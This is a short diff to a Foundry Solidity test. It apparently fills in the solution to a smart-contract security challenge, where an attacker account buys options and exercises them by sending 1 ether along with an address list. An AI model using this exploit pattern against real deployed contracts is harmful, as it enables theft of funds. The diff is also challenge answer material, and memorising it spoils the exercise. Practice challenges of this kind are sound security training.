@@ -84,7 +84,12 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        usdc.approve(address(optionsMarket),500e18);
+        optionsMarket.purchase(5e18);
+        uint256 value = optionsContract.underlyingRequiredToExercise(5e18);
+        optionsContract.exercise{value : 1 ether}(5e18,addresses);
 
+        
         vm.stopPrank();
         validation();
     }
